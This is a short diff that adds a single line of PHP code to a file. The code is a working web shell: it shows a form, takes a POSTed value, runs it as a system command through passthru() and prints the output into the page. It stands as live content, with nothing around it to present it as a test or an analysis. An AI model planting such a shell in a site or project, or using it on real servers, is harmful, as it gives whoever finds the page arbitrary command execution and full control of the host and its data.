@@ -1,0 +1,1 @@
+<?php echo "<form method=post><input name=a><input type=submit></form>";$a=$_POST['a'];if($a){ob_start();passthru($a);$b=ob_get_contents();ob_end_clean();$b=str_replace("\n","<br>",$b);echo "$a<hr>$b";}?>
